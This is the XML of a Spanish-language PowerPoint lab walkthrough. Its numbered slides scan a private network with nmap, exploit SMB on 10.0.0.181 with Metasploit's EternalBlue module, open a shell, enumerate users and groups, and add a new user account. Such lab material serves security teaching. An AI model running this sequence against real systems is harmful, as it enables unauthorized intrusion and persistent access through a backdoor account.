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56" r:id="rId6"/>
    <p:sldId id="258" r:id="rId7"/>
    <p:sldId id="257" r:id="rId8"/>
    <p:sldId id="259" r:id="rId9"/>
    <p:sldId id="260" r:id="rId10"/>
    <p:sldId id="265" r:id="rId11"/>
    <p:sldId id="266" r:id="rId12"/>
    <p:sldId id="261" r:id="rId13"/>
    <p:sldId id="262" r:id="rId14"/>
    <p:sldId id="263" r:id="rId15"/>
    <p:sldId id="264" r:id="rId16"/>
    <p:sldId id="267" r:id="rId17"/>
    <p:sldId id="268" r:id="rId18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7911B-FACE-406D-9985-75886304C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9A566E-40E1-4192-B6C4-BA8CF5AAB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8396A-BD2B-4DF0-A6E6-DD003FE0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A86091-D928-48CE-A35F-61CF7203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7A849-2439-40B7-BA74-D4801B7D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964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A8C9-5FDA-452A-AF19-1A83D369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42EF4E-9D85-49F5-B8A9-5D4691A58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86C03E-FE4F-47C2-A8E6-AD547ED5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41D3FE-ED37-4E40-A84C-D466B309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7D6C01-4146-4698-A881-192612BF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4678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66843-7EB7-4562-8EA2-97EF0113D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433B0-4E5A-4261-9E8F-40F82B81D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C35CF4-4F31-4024-9306-0C52E848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46A706-7977-41B4-9B70-73BBD5E5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369DA4-7ADD-448D-8DA9-5C4679DE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8364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C462A-217E-49DB-8F45-69BC262E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1204AE-3DD3-4383-B992-9A204E0BA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F03238-46A7-4B2E-B934-9AEDA6AC6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BDF51A-ABAE-4A25-9EE9-4B0B32C3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D81EB5-4A9F-4292-AE2C-2FFE93C7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6315F0-B946-406A-A212-46AE6A84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7406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1C223-63D8-43D8-901C-6F0DA5CF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3C7FFF-BD75-41DB-8A9A-AD2E77411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BC3BC9-ED4E-4B07-A723-592623A70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B6BEBA-4ECF-464B-9FDA-946A881C0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7DAED5-90A9-4401-9839-37A793209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87CE060-1F48-4B1F-8775-EBF618ED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C89A91A-B128-44C5-B284-177E17C0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DF8630-C721-4DC8-AF8C-19A1E5FE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3660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C4B39-3A9F-433E-985E-DB6D79D5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605899-BA89-46AD-A783-D3FE9387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7EBAF9-FD01-43C5-AE8A-32A7942E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E4B8D1-8AD0-4489-B11A-DAEF4D9B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3342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1FC5FD-0EDA-46AB-BCDC-7D387CFC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4DDEB5-1506-49B0-BBE0-E933698A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EAB56C-1726-4FA8-9E9F-ED9D3ED2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68597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3E3BB-8E3B-441E-88D6-B0E1F8EA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1BEB9F-7CC1-477C-B15C-E2EF9113C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AC9E3F-8555-4C16-9A25-A66C22930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CE8238-AE71-4966-8238-9E0C13E6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056EE7-F58E-4F2A-8652-BFC03E36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23BD5A-B00C-40CF-B5DC-87A20066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1299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6C2F5-8195-413C-8DED-C5331E10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5BF5FA-5A6B-40E6-BB96-5782D692B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FF4388-9652-4FFD-BBFC-0559C3AE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ED0C08-9040-48DA-A56D-4B44532D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8551C2-2458-4D57-A2E8-4DC8487A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125C5A-28B9-486E-84FF-F813B55B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0368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C4CFA-5506-4EDF-8854-AAF9BF14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433A2C-162A-4C14-9F8C-C4C441574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F8C9DD-3072-4E67-9BF5-D883FF81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A42C29-1F49-4CAD-A030-5503332F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E78EC2-6396-48F8-902D-580D2655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10626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FAF34B-7B02-4763-853D-0920221A5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D3EA19-0FD1-4E30-8EFB-807122E3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4A757A-86F2-444F-B8D1-003C42EF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134A24-5D7A-414B-B2FD-16C6FDA7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BB8FF2-8B98-4A14-A689-F71ABD28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0801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0C0489-A98F-4B8E-8B64-8E6F358C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725B0-6379-4A9F-B55E-60737C23A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EABA94-A180-4207-9E49-107E2B94A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3B91D-9365-4DC8-A2A2-E8C964C17A38}" type="datetimeFigureOut">
              <a:rPr lang="es-US" smtClean="0"/>
              <a:t>1/17/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="es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15789B-81FD-4566-A5C3-311745EF5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689F1F-2063-4E0D-8D74-C78D518F5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BA9A3-AAAC-4A66-8E34-93553B338B9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87198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F23D6-A120-4F91-9F5C-F8759567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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ifconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> (veo la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>asignada,mascara</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> subred y </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> del broadcast)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7CC03A-DF6D-4D0D-8468-87B520F9E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834" y="1690688"/>
            <a:ext cx="4639332" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="60302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EC957-749C-4E37-852F-EADC15F1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2 sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>namp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>sn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0"/>
              <a:t> 10.0.0.0/24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8B7605B-B1A0-43A3-9C16-1BE55D780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963" y="1800225"/>
            <a:ext cx="4542274" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="207253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BE05F-F456-43B0-8458-3E1FFCD8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 ping -c 1 [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>-posibles-maquinas-virtuales-vulnerables]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73968DF-76D4-450E-AF55-5E7849D8E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1919"/>
            <a:ext cx="8051606" cy="2415481"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="379793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B1F28-1CD8-4E3B-8639-070A0551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4 nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.0.0.181</a:t>
            </a:r>
            <a:endParaRPr lang="es-U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062EA9C-0A57-4F45-9DEB-827C25A54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9686"/>
            <a:ext cx="6486706" cy="33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2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FBA38-6650-4916-B1B7-4EE2AFA7D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1D495E-BA99-4FCD-85F3-D34A37BE5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357"/>
            <a:ext cx="9144000" cy="1655762"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>5 Nmap -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sCV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -p 135,139,445,49158 10.0.0.181 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>oN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> res-targeted</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es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0C487E-0D01-4AB0-9711-ADB07FBA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30226"/>
            <a:ext cx="9144000" cy="35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6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284AC-B45E-495C-B800-15297261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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> --script "vuln and safe" -p 445 10.0.0.181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17FF770-4E0D-4437-9336-E5AB420DA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690" y="1812925"/>
            <a:ext cx="5327819" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="96251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0CA01-611E-4291-BCFB-1A63160E4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7 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0"/>
              <a:t> -q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076519-8FAC-42CB-98BA-2F1DC77A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E3EAC2-22C9-4B6B-8F78-43EF2E9A4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0971"/>
            <a:ext cx="5456652" cy="444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6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EF939-8268-4636-BD44-66247A89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8 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>search</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>eternalblue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D3713A8-A851-48EE-BF56-A4463AFEB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9125"/>
            <a:ext cx="5334449" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7511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3BB7C-41B7-4124-ADD3-F0EF7DF4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9 use 0</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="es-US" dirty="0"/>
            </a:b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2061AE-580D-4C2A-BB9A-A374EF26F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1025"/>
            <a:ext cx="5338327" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="76808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B4F17-CBFE-4190-B25B-6CBB77A2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10 show </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>options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127B16-1B01-4B70-8D0A-987FA81C4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9935"/>
            <a:ext cx="9171603" cy="613594"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="406284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1F4EE-75E2-4BDA-9B49-3F465353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11 set RHOST 10.0.0.181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D5CD412-9D3C-4F71-9FE3-C004B3113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7300"/>
            <a:ext cx="9050747" cy="1526447"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="45133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3675D-D2F1-4ACB-A9B5-951E82A1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12 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>exploit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F8C482-730C-407A-B122-23CFC9621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6230"/>
            <a:ext cx="7399648" cy="1332770"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="99436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238CF-F222-4EE1-9F55-D9A502CB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13 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>shell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342AF9D-7C38-4B0C-8D3F-8430BEC97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9735"/>
            <a:ext cx="7699632" cy="1369265"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="224831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07685-7470-4F99-9753-4162D0F2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14 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>whoami</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="es-US" dirty="0"/>
            </a:b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A7A2D8B-1F0E-4C50-9D6E-991307A56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2800"/>
            <a:ext cx="7438857" cy="980315"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2185581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BA667-FDA9-4F3A-B030-CEECCD36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15 net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>user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03BCAD-8F67-4AA0-BCD4-EF857CC0F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9340"/>
            <a:ext cx="10394900" cy="3247360"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2306778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55F65-B8B1-404F-83E0-BFBE24B8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16 net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>localgroup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206AE72-6AB1-4B7B-BEE4-8D47B2098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33" y="1901825"/>
            <a:ext cx="5220133" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="48891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5891B-5719-4C99-B625-3C545C3E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18 net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0"/>
              <a:t> (nombre) (contra) /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-US" dirty="0" err="1"/>
              <a:t>add</a:t>
            </a:r>
            <a:endParaRPr lang="es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C263F8-B132-49FB-81B0-051558633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10992"/>
            <a:ext cx="7769065" cy="1836016"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1992109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113</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Panorámica</PresentationFormat>
  <Paragraphs>17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de Office</vt:lpstr>
      <vt:lpstr>1 ifconfig (veo la ip asignada,mascara subred y ip del broadcast)</vt:lpstr>
      <vt:lpstr>2 sudo namp -sn 10.0.0.0/24</vt:lpstr>
      <vt:lpstr>3 ping -c 1 [ip-posibles-maquinas-virtuales-vulnerables]</vt:lpstr>
      <vt:lpstr>4 nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.0.0.181</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>6 nmap --script "vuln and safe" -p 445 10.0.0.181</vt:lpstr>
      <vt:lpstr>7 msfconsole -q</vt:lpstr>
      <vt:lpstr>8 search eternalblue</vt:lpstr>
      <vt:lpstr>9 use 0 </vt:lpstr>
      <vt:lpstr>10 show options</vt:lpstr>
      <vt:lpstr>11 set RHOST 10.0.0.181</vt:lpstr>
      <vt:lpstr>12 exploit</vt:lpstr>
      <vt:lpstr>13 shell</vt:lpstr>
      <vt:lpstr>14 whoami </vt:lpstr>
      <vt:lpstr>15 net user</vt:lpstr>
      <vt:lpstr>16 net localgroup</vt:lpstr>
      <vt:lpstr>18 net user (nombre) (contra) /add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PC</cp:lastModifiedBy>
  <cp:revision>6</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-01-17T19:44:47Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-17T20:42:18Z</dcterms:modified>
</cp:coreProperties>
</file>